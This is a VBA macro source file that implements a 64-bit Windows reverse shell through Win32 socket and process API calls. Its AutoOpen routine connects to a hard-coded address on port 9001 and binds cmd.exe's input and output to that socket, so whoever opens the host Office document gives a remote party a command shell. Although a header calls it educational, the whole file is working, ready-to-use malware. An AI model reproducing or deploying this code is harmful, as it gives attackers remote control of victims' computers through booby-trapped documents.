' ********************************************************************************************************
'
' 64-bit compatible VBA reverse shell using Win32 API calls.
' Most of the code was adapted from:
'
'   * https://stackoverflow.com/questions/8670391
'   * https://stackoverflow.com/questions/43197814
'   * https://renenyffenegger.ch/notes/development/languages/VBA/Win-API/examples/
'
' This code demonstrates calling Win32 API functions from VBA for educational purposes only.
'
' Author: Tobias Neitzel (@qtc_de) - Adapted for 64-bit compatibility.
'
' ********************************************************************************************************

Private Type WSAData
   wVersion As Integer
   wHighVersion As Integer
   szDescription(0 To 255) As Byte
   szSystemStatus(0 To 128) As Byte
   iMaxSockets As Integer
   iMaxUdpDg As Integer
   lpVendorInfo As LongPtr  ' Updated for 64-bit compatibility
End Type

Private Type sockaddr_in
    sin_family As Integer
    sin_port As Integer
    sin_addr As Long
    sin_zero(0 To 7) As Byte
End Type

Private Type PROCESS_INFORMATION
    hProcess    As LongPtr
    hThread     As LongPtr
    dwProcessId As Long
    dwThreadId  As Long
End Type

Private Type STARTUPINFO
    cb              As Long
    lpReserved      As String
    lpDesktop       As String
    lpTitle         As String
    dwX             As Long
    dwY             As Long
    dwXSize         As Long
    dwYSize         As Long
    dwXCountChars   As Long
    dwYCountChars   As Long
    dwFillAttribute As Long
    dwFlags         As Long
    wShowWindow     As Integer
    cbReserved2     As Integer
    lpReserved2     As LongPtr  ' Updated for 64-bit
    hStdInput       As LongPtr
    hStdOutput      As LongPtr
    hStdError       As LongPtr
End Type

' Updated all API declarations with PtrSafe and LongPtr where necessary
Private Declare PtrSafe Function WSAStartup Lib "ws2_32.dll" ( _
     ByVal wVersionRequested As Integer, _
     ByRef data As WSAData _
     ) As Long

Private Declare PtrSafe Function connect Lib "ws2_32.dll" ( _
    ByVal socket As LongPtr, _
    ByRef sockaddr As sockaddr_in, _
    ByVal namelen As Long _
    ) As Long

Private Declare PtrSafe Function closesocket Lib "ws2_32.dll" ( _
    ByVal socket As LongPtr _
    ) As Long

Private Declare PtrSafe Function WSASocketA Lib "ws2_32.dll" ( _
    ByVal af As Long, _
    ByVal typ As Long, _
    ByVal protocol As Long, _
          lpProtocolInfo As Any, _
    ByVal g As Long, _
    ByVal dwFlags As Long _
    ) As LongPtr ' Updated to return LongPtr

Public Declare PtrSafe Function inet_addr Lib "ws2_32.dll" ( _
    ByVal cp As String _
    ) As Long

Public Declare PtrSafe Function htons Lib "ws2_32.dll" ( _
    ByVal hostshort As Integer _
    ) As Integer

Private Declare PtrSafe Function CreateProcess Lib "kernel32.dll" Alias "CreateProcessA" ( _
    ByVal lpApplicationName As String, _
    ByVal lpCommandLine As String, _
    ByRef lpProcessAttributes As Any, _
    ByRef lpThreadAttributes As Any, _
    ByVal bInheritHandles As Long, _
    ByVal dwCreationFlags As Long, _
    ByVal lpEnvironment As LongPtr, _
    ByVal lpCurrentDirectory As String, _
          lpStartupInfo As STARTUPINFO, _
          lpProcessInformation As PROCESS_INFORMATION _
    ) As LongPtr ' Updated for 64-bit

Private Declare PtrSafe Function WSAGetLastError Lib "ws2_32.dll" () As Long

Function ReverseShell(IP As String, PORT As Integer) As Long
    Dim socket                As LongPtr
    Dim addr                  As sockaddr_in
    Dim ret                   As Long
    Dim data                  As WSAData
    Dim si                    As STARTUPINFO
    Dim pi                    As PROCESS_INFORMATION
    
    ret = WSAStartup(&H202, data)

    If (ret <> 0) Then
        ReverseShell = WSAGetLastError()
        Exit Function
    End If

    socket = WSASocketA(2, 1, 0, ByVal 0&, 0, 0)
    If (socket = 0) Then ' WSASocketA returns INVALID_SOCKET (0) in 64-bit
        ReverseShell = WSAGetLastError()
        Exit Function
    End If

    addr.sin_family = 2
    addr.sin_port = htons(PORT)
    addr.sin_addr = inet_addr(IP)
    ret = connect(socket, addr, Len(addr))

    If (ret <> 0) Then
        ReverseShell = WSAGetLastError()
        Exit Function
    End If

    si.cb = LenB(si)
    si.dwFlags = &H100
    si.hStdInput = socket
    si.hStdOutput = socket
    si.hStdError = socket
    
    Call CreateProcess(vbNullString, "cmd.exe", ByVal 0&, ByVal 0&, True, &H8000000, ByVal 0&, vbNullString, si, pi)
    closesocket (socket)
End Function

Sub AutoOpen()
    Call ReverseShell("192.168.25.22", 9001)
End Sub
